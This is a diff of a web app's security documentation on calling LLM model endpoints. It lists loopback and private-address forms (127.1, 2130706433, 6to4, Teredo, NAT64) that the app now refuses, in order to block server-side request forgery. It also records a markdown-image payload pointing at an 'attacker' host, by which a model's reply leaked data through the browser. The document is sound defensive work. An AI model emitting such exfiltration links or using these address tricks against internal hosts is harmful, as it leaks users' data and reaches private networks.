@@ -34,11 +34,15 @@ when the port is published on loopback behind a proxy on the Docker host (see *F
   the server's endpoint, as documented. `/config.json` reports `serverModel` only when
   `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
 - A browser-supplied model endpoint must be on a public address: a literal loopback, private,
-  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6 included), or a
-  name that resolves to one, is refused with 400 before anything is sent. `LLM_ALLOW_HTTP=1`
-  lifts this along with the https rule (a model on the operator's own network);
+  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6, IPv4 inside 6to4,
+  Teredo or NAT64, and numeric short forms such as `127.1` or `2130706433` included),
+  `localhost` and names under it, or a name that resolves to one, is refused with 400 before
+  anything is sent. The host checked is the one httpx connects to, and a URL httpx would refuse
+  (a control character, a space in the host) is a 400 too. `LLM_ALLOW_HTTP=1` lifts the
+  address check along with the https rule (a model on the operator's own network);
   `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
-  DNS rebinding.
+  DNS rebinding, so a public host should also restrict egress. A redirect from a model endpoint
+  is never followed (it is an error).
 - Markdown from the model (task page) and from skill files (Capabilities page) renders no
   images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
   An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.
